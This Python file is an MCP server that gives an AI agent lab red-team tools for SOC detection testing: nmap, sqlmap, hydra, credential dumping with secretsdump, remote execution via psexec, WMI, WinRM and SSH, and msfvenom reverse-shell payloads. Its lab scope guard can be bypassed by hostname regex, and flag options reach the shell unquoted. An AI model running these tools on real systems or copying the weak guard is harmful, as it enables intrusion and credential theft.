#!/usr/bin/env python3
"""
Red-Team MCP Server — SOC detection validation via a Kali attacker box.

An MCP *server* (not a client — the client is Claude Code) that exposes a curated
set of offensive tools. Each tool SSHes into a Kali Linux VM on the lab's Tailscale
mesh and runs the real utility (nmap, sqlmap, impacket, etc.), returning structured
output.

Purpose: emulate both an EXTERNAL (WAN/internet) and an INTERNAL (LAN) attacker so we
can validate — and honestly measure — what the blue-team SIEM/SOAR pipeline actually
detects. Every attack here is meant to be *seen* by the detection layer; the point is
the alert it produces, not the compromise.

Design principle, deliberately mirroring the SOAR side's `policy_guard()`:
    The server refuses to attack anything outside the lab. A code-side scope guard
    (`_assert_in_scope`) validates every target against an allowlist of lab networks
    before any tool runs. The lab's own SOC infrastructure (ELK, TheHive/Cortex, the
    GPU LLM host) is deliberately NOT in scope — those are defensive assets, not
    victims, exactly as they are protected assets on the SOAR block-guard side.

Config via env vars (sensible lab defaults):
    KALI_HOST   default 100.125.163.9   (Kali on the tailnet)
    KALI_USER   default kali
    KALI_PASS   default kali
"""

import ipaddress
import os
import re
import shlex
import subprocess
from urllib.parse import urlparse

from mcp.server.fastmcp import FastMCP

mcp = FastMCP("redteam-soc")

# --------------------------------------------------------------------------------
# Config
# --------------------------------------------------------------------------------
KALI_HOST = os.environ.get("KALI_HOST", "100.125.163.9")
KALI_USER = os.environ.get("KALI_USER", "kali")
KALI_PASS = os.environ.get("KALI_PASS", "kali")

DEFAULT_TIMEOUT = int(os.environ.get("REDTEAM_TIMEOUT", "300"))  # seconds per tool
MAX_OUTPUT = int(os.environ.get("REDTEAM_MAX_OUTPUT", "20000"))  # chars returned

# --------------------------------------------------------------------------------
# Scope guard — the red-team analogue of the SOAR policy_guard.
# Only lab victims may be attacked. Everything else (public internet, and our own
# SOC infrastructure) is refused before any tool runs.
# --------------------------------------------------------------------------------
_ALLOWED_NETS = [
    ipaddress.ip_network("192.168.10.0/24"),   # lab LAN (Windows + Linux victims, pfSense LAN)
    ipaddress.ip_network("172.16.0.0/24"),      # lab DMZ (Juice Shop)
    ipaddress.ip_network("192.168.116.0/24"),   # local VMware lab segment (Kali + local VMs)
]
_ALLOWED_IPS = {
    "100.101.109.12",   # Windows victim (Tailscale)
    "100.105.72.46",    # linux-lan victim (Tailscale)
    "100.70.145.65",    # pfSense / NAT-published Juice Shop (Tailscale)
}
# SOC infrastructure that must NEVER be attacked (defensive assets, not victims).
# Listed explicitly for clarity even though they fall outside the allowlist anyway.
_PROTECTED = {
    "100.99.54.59",     # ELK / SIEM
    "100.124.232.121",  # TheHive / Cortex
    "100.90.228.58",    # GPU LLM host
    "100.125.163.9",    # the Kali box itself
}


def _extract_host(target: str) -> str:
    """Pull a bare host out of a URL, host:port, or plain IP/hostname."""
    t = target.strip()
    if "://" in t:
        t = urlparse(t).hostname or t
    else:
        # strip a :port if present (but keep IPv6 out of scope for the lab)
        t = t.split("/")[0]
        if t.count(":") == 1:
            t = t.split(":")[0]
    return t


def _assert_in_scope(target: str) -> str:
    """
    Raise ValueError unless `target` is a permitted lab victim.
    Returns the extracted host on success.
    """
    host = _extract_host(target)
    if host in _PROTECTED:
        raise ValueError(
            f"REFUSED: {host} is SOC/defensive infrastructure, never a red-team target."
        )
    if host in _ALLOWED_IPS:
        return host
    # Known lab hostnames are allowed too
    if re.search(r"(juice|desktop-fk7ro72|linux-lan|pfsense)", host, re.I):
        return host
    try:
        ip = ipaddress.ip_address(host)
    except ValueError:
        raise ValueError(
            f"REFUSED: '{host}' is not a recognised lab target (not an allowed IP, "
            f"network, or lab hostname). Red-team scope is lab-only."
        )
    for net in _ALLOWED_NETS:
        if ip in net:
            return host
    raise ValueError(
        f"REFUSED: {host} is outside the lab attack scope "
        f"(allowed: 192.168.10.0/24, 172.16.0.0/24, 192.168.116.0/24, and the "
        f"three lab-victim Tailscale IPs). This tool never attacks the public internet."
    )


# --------------------------------------------------------------------------------
# Execution primitive — run a command on the Kali box over SSH.
# --------------------------------------------------------------------------------
def _kali_run(command: str, timeout: int = DEFAULT_TIMEOUT) -> str:
    """
    Execute `command` on the Kali VM via SSH and return combined stdout/stderr.
    Output is truncated to MAX_OUTPUT chars.
    """
    ssh = [
        "sshpass", "-p", KALI_PASS,
        "ssh", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=10",
        f"{KALI_USER}@{KALI_HOST}", command,
    ]
    try:
        proc = subprocess.run(
            ssh, capture_output=True, text=True, timeout=timeout,
        )
    except subprocess.TimeoutExpired:
        return f"[TIMEOUT after {timeout}s]\ncommand: {command}"
    except FileNotFoundError:
        return "[ERROR] sshpass/ssh not found on the host running this MCP server."

    out = (proc.stdout or "") + (proc.stderr or "")
    header = f"$ {command}\n(exit={proc.returncode})\n" + ("-" * 60) + "\n"
    body = out if len(out) <= MAX_OUTPUT else out[:MAX_OUTPUT] + \
        f"\n...[truncated, {len(out) - MAX_OUTPUT} more chars]"
    return header + body


# ================================================================================
# EXTERNAL / RECON tools
# ================================================================================
@mcp.tool()
def nmap_scan(target: str, options: str = "-sV -T4") -> str:
    """
    Run an nmap scan against a lab target (port/service discovery, recon).

    target:  lab IP or hostname (scope-guarded to lab only).
    options: nmap flags. Default '-sV -T4' (service/version, fast). Examples:
             '-sV -p 1-1000', '-A', '-sC -sV', '-p-'.
    Maps to the Reconnaissance / Discovery tactics (MITRE T1046) and the
    pfsense_portscan detection rule.
    """
    host = _assert_in_scope(target)
    return _kali_run(f"nmap {options} {shlex.quote(host)}")


@mcp.tool()
def run_sqlmap(url: str, options: str = "--batch --level=1 --risk=1") -> str:
    """
    Run sqlmap against a lab web URL to test for SQL injection.

    url:     full target URL (e.g. http://100.70.145.65:8080/rest/products/search?q=x).
    options: sqlmap flags. Default is a safe low level/risk batch run. Add e.g.
             '--data=...' for POST bodies, '--dbs' to enumerate databases.
    Maps to OWASP A03 / the juiceshop_sqli detection rule.
    """
    _assert_in_scope(url)
    return _kali_run(f"sqlmap -u {shlex.quote(url)} {options}")


@mcp.tool()
def run_hydra(target: str, service: str, userlist: str, passlist: str,
              options: str = "", module_args: str = "") -> str:
    """
    Run a hydra brute-force against a lab service.

    target:      lab IP/host.
    service:      hydra module (ssh, http-post-form, ftp, smb, rdp, ...).
    userlist:     path to a username list ON KALI, or 'user:name' for a single user
                  (pass as -l name via options instead if single).
    passlist:     path to a password list ON KALI (e.g. /usr/share/wordlists/rockyou.txt).
    options:      extra hydra FLAGS that go before target/service (e.g. '-t 4', '-s 8080').
    module_args:  the module's own trailing argument, required by form-style modules
                  (http-post-form, http-get-form). Hydra requires this to come AFTER
                  target+service on the command line, e.g. for a Juice-Shop-style JSON
                  login: '/rest/user/login:{"email":"^USER^","password":"^PASS^"}:'
                  'F=<string never in a failed response>:H=Content-Type: application/json'
    Maps to MITRE T1110 / the juiceshop_bruteforce and *_ssh_bruteforce rules.
    """
    host = _assert_in_scope(target)
    tail = f" {shlex.quote(module_args)}" if module_args else ""
    return _kali_run(
        f"hydra -L {shlex.quote(userlist)} -P {shlex.quote(passlist)} "
        f"{options} {shlex.quote(host)} {shlex.quote(service)}{tail}"
    )


@mcp.tool()
def http_request(url: str, method: str = "GET", data: str = "",
                 headers: str = "") -> str:
    """
    Send a single raw HTTP request via curl — a generic escape hatch for testing
    exact payloads/endpoints that don't fit sqlmap/hydra/nikto/gobuster's assumptions
    (e.g. JSON APIs, precise one-shot exploit attempts).

    url:     full target URL.
    method:  HTTP method (default GET).
    data:    raw request body (e.g. a JSON string for a POST).
    headers: extra 'Header: value' lines, one per line.
    Response headers + body are both returned (curl -i).
    """
    _assert_in_scope(url)
    header_flags = " ".join(
        f"-H {shlex.quote(h)}" for h in headers.splitlines() if h.strip()
    )
    data_flag = f"-d {shlex.quote(data)}" if data else ""
    return _kali_run(
        f"curl -s -i -X {shlex.quote(method)} {header_flags} {data_flag} "
        f"{shlex.quote(url)}"
    )


@mcp.tool()
def http_json_bruteforce(url: str, json_template: str, passlist: str,
                         limit: int = 30, method: str = "POST",
                         headers: str = "") -> str:
    """
    Send a rapid burst of requests against a JSON API endpoint, substituting each
    line of a password wordlist into the request body. A generic alternative to
    hydra's http-post-form module for JSON APIs — hydra's colon-delimited module
    syntax handles JSON bodies (which are full of colons) poorly.

    url:           full target URL.
    json_template: JSON body with the literal placeholder PASSWORD_HERE where the
                   guessed password goes, e.g.
                   '{"email":"admin@juice-sh.op","password":"PASSWORD_HERE"}'
    passlist:      path to a password wordlist ON KALI.
    limit:         max lines to try from passlist (default 30, keeps it fast/bounded).
    method:        HTTP method (default POST).
    headers:       extra 'Header: value' lines, one per line (Content-Type:
                   application/json is added automatically if not present).
    Returns a status-code histogram plus the raw sequence, so a 200 (or other
    outlier) among many 401s signals a real hit.
    Maps to MITRE T1110 / the juiceshop_bruteforce and *_login_bruteforce rules.
    """
    _assert_in_scope(url)
    header_flags = " ".join(
        f"-H {shlex.quote(h)}" for h in headers.splitlines() if h.strip()
    )
    if "content-type" not in headers.lower():
        header_flags = f"-H 'Content-Type: application/json' {header_flags}"
    cmd = (
        f"tmpl={shlex.quote(json_template)}; "
        f"head -n {int(limit)} {shlex.quote(passlist)} | while IFS= read -r pw; do "
        f'body="${{tmpl//PASSWORD_HERE/$pw}}"; '
        f"curl -s -o /dev/null -w '%{{http_code}}\\n' -X {shlex.quote(method)} "
        f"{header_flags} -d \"$body\" {shlex.quote(url)}; done | sort | uniq -c"
    )
    return _kali_run(cmd)


@mcp.tool()
def run_nikto(target: str, port: int = 80) -> str:
    """
    Run a nikto web-server vulnerability scan against a lab target.

    Maps to web-attack recon; produces noisy web-server probes the app/IDS layer
    should flag. target: lab IP/host. port: web port (default 80; use 8080 for the
    NAT-published Juice Shop).

    Uses a longer timeout than the other tools (nikto's full plugin set routinely
    takes 5-10+ minutes even against a small target) so it can actually finish
    instead of being cut off mid-scan.
    """
    host = _assert_in_scope(target)
    return _kali_run(
        f"nikto -host {shlex.quote(host)} -port {int(port)}",
        timeout=max(DEFAULT_TIMEOUT, 600),
    )


@mcp.tool()
def run_gobuster(url: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt",
                 options: str = "") -> str:
    """
    Directory/endpoint enumeration with gobuster against a lab web URL.

    url:      base URL. wordlist: path ON KALI. options: extra gobuster flags.
    Recon / content-discovery against the web target.
    """
    _assert_in_scope(url)
    return _kali_run(f"gobuster dir -u {shlex.quote(url)} -w {shlex.quote(wordlist)} {options}")


# ================================================================================
# INTERNAL — Windows tools (impacket / netexec)
# ================================================================================
@mcp.tool()
def netexec_enum(target: str, protocol: str = "smb", username: str = "",
                 password: str = "", options: str = "") -> str:
    """
    Enumerate a Windows lab host with netexec (nxc).

    target:   lab Windows IP/host.
    protocol: smb | winrm | rdp | ssh (default smb).
    username/password: credentials (leave blank for null/anonymous).
    options:  nxc flags, e.g. '--shares', '--users', '--sessions', '--pass-pol'.
    Maps to enumeration ahead of lateral movement / privilege escalation.
    """
    host = _assert_in_scope(target)
    cred = ""
    if username:
        cred = f"-u {shlex.quote(username)} -p {shlex.quote(password)}"
    return _kali_run(f"nxc {shlex.quote(protocol)} {shlex.quote(host)} {cred} {options}")


@mcp.tool()
def smb_enum(target: str, username: str = "", password: str = "") -> str:
    """
    Enumerate SMB shares/users on a lab Windows host (enum4linux-style overview).

    Uses enum4linux for a broad first pass. Leave creds blank for anonymous.
    """
    host = _assert_in_scope(target)
    cred = ""
    if username:
        cred = f"-u {shlex.quote(username)} -p {shlex.quote(password)}"
    return _kali_run(f"enum4linux -a {cred} {shlex.quote(host)}")


@mcp.tool()
def dump_secrets(target: str, username: str, password: str, domain: str = "") -> str:
    """
    Attempt remote credential dumping via impacket-secretsdump (SAM/LSA).

    target/username/password: Windows host + LOCAL ADMIN creds. domain: optional.
    Maps to MITRE T1003.001 / the win_credential_dump detection rule — this is
    exactly the behaviour that rule exists to catch.
    """
    host = _assert_in_scope(target)
    dom = f"{domain}/" if domain else ""
    tgt = f"{dom}{username}:{password}@{host}"
    return _kali_run(f"impacket-secretsdump {shlex.quote(tgt)}")


@mcp.tool()
def wmi_exec(target: str, username: str, password: str, command: str,
             domain: str = "") -> str:
    """
    Execute a command on a lab Windows host over WMI (impacket-wmiexec, one-shot).

    Maps to MITRE T1047 / the win_wmi_execution detection rule.
    command: the Windows command to run (e.g. 'whoami', 'ipconfig').
    """
    host = _assert_in_scope(target)
    dom = f"{domain}/" if domain else ""
    tgt = f"{dom}{username}:{password}@{host}"
    return _kali_run(f"impacket-wmiexec {shlex.quote(tgt)} {shlex.quote(command)}")


@mcp.tool()
def psexec(target: str, username: str, password: str, command: str,
           domain: str = "") -> str:
    """
    Execute a command on a lab Windows host via impacket-psexec (creates a service).

    Maps to the win_new_service detection rule — psexec installs a temporary service
    to run its payload, which that rule is built to detect.
    command: the Windows command to run.
    """
    host = _assert_in_scope(target)
    dom = f"{domain}/" if domain else ""
    tgt = f"{dom}{username}:{password}@{host}"
    return _kali_run(f"impacket-psexec {shlex.quote(tgt)} {shlex.quote(command)}")


@mcp.tool()
def winrm_exec(target: str, username: str, password: str, command: str) -> str:
    """
    Execute a command on a lab Windows host over WinRM (via nxc, one-shot).

    Maps to MITRE T1021 (Remote Services) / the win_lateral_movement detection rule.
    (evil-winrm is also installed on Kali for interactive sessions if needed.)
    command: the Windows command to run.
    """
    host = _assert_in_scope(target)
    return _kali_run(
        f"nxc winrm {shlex.quote(host)} -u {shlex.quote(username)} "
        f"-p {shlex.quote(password)} -x {shlex.quote(command)}"
    )


# ================================================================================
# INTERNAL — Linux tools
# ================================================================================
@mcp.tool()
def ssh_exec(target: str, username: str, password: str, command: str) -> str:
    """
    SSH into a lab Linux host and run a command (as an attacker with creds).

    Maps to MITRE T1078 / the linux_root_login detection rule (esp. root logins).
    Kali connects onward to the target; command runs on the TARGET, not Kali.
    """
    host = _assert_in_scope(target)
    inner = (
        f"sshpass -p {shlex.quote(password)} ssh -o StrictHostKeyChecking=no "
        f"-o ConnectTimeout=8 {shlex.quote(username)}@{shlex.quote(host)} "
        f"{shlex.quote(command)}"
    )
    return _kali_run(inner)


@mcp.tool()
def linpeas_scan(target: str, username: str, password: str) -> str:
    """
    Run LinPEAS privilege-escalation enumeration on a lab Linux host.

    Pipes LinPEAS from Kali over SSH into the target and runs it in memory.
    NOTE: there is currently NO detection rule for Linux privesc — running this
    surfaces a genuine, documented coverage gap (good report material). Output is
    large; consider grepping the returned text for 'PE - ' highlights.
    """
    host = _assert_in_scope(target)
    inner = (
        f"sshpass -p {shlex.quote(password)} ssh -o StrictHostKeyChecking=no "
        f"-o ConnectTimeout=8 {shlex.quote(username)}@{shlex.quote(host)} "
        f"'bash -s -- -q' < /usr/share/peass/linpeas/linpeas.sh 2>&1 | "
        f"sed -r 's/\\x1B\\[[0-9;]*[mK]//g'"  # strip ANSI colour codes
    )
    return _kali_run(inner, timeout=420)


# ================================================================================
# POST-EXPLOITATION
# ================================================================================
@mcp.tool()
def msf_generate_payload(payload: str, lhost: str, lport: int,
                         fmt: str = "exe", out_name: str = "payload") -> str:
    """
    Generate a Metasploit payload with msfvenom (written to /tmp on Kali).

    payload: e.g. 'windows/x64/meterpreter/reverse_tcp',
             'linux/x64/meterpreter/reverse_tcp'.
    lhost:   callback IP (the Kali/attacker IP). lport: callback port.
    fmt:     output format (exe, elf, raw, ...). out_name: base filename.
    Maps to testing win_defender_disabled (does AV catch the payload?) and the
    pfsense_outbound_anomaly / pfsense_dns_tunnel C2 rules (does the callback get
    flagged?). This only CREATES the payload; delivery/execution is a separate step.
    lhost is not scope-guarded (it is the attacker's own address, not a victim).
    """
    out_path = f"/tmp/{shlex.quote(out_name)}.{shlex.quote(fmt)}"
    cmd = (
        f"msfvenom -p {shlex.quote(payload)} LHOST={shlex.quote(lhost)} "
        f"LPORT={int(lport)} -f {shlex.quote(fmt)} -o {out_path} && "
        f"ls -la {out_path} && file {out_path}"
    )
    return _kali_run(cmd)


if __name__ == "__main__":
    mcp.run()
